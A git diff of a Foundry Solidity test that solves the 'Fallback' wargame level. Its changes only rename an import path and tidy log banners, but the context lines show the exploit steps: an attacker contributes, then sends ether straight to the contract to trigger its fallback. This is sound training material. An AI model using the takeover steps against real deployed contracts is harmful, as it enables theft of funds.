@@ -3,7 +3,7 @@ pragma solidity ^0.8.0;
 
 import "forge-std/Test.sol";
 import "forge-std/console.sol";
-import {Fallback} from "../fallback/Fallback.sol";
+import {Fallback} from "../01 fallback/Fallback.sol";
 
 contract FallbackTest is Test {
     address constant CONTRACT = address(42_000);
@@ -27,7 +27,7 @@ contract FallbackTest is Test {
 
     function test_Attack() public {
         console.log(" ");
-        console.log("====== INIT ========");
+        console.log("====== INIT ======");
         console.log("deployer address : ");
         console.log(address(fallbackContract.owner()));
         console.log("contractOwner address: ");
@@ -35,7 +35,7 @@ contract FallbackTest is Test {
         assertEq(fallbackContract.owner(), CONTRACT);
 
         console.log(" ");
-        console.log("====== STEP 1 ========");
+        console.log("====== STEP 1 ======");
         vm.expectRevert("caller is not the owner");
         vm.prank(ATTACKER);
         fallbackContract.withdraw();
@@ -52,7 +52,7 @@ contract FallbackTest is Test {
         console.log(contributionAttacker);
 
         console.log(" ");
-        console.log("====== STEP 2 ========");
+        console.log("====== STEP 2 ======");
         vm.startPrank(ATTACKER);
         fallbackContract.contribute{value: 0.0001 ether}();
         uint newContributionAttacker = fallbackContract.getContribution();
@@ -61,7 +61,7 @@ contract FallbackTest is Test {
         console.log(newContributionAttacker);
 
         console.log(" ");
-        console.log("====== STEP 3 ========");
+        console.log("====== STEP 3 ======");
         (bool sent, ) = address(fallbackContract).call{value: 1}("");
         assert(sent);
 
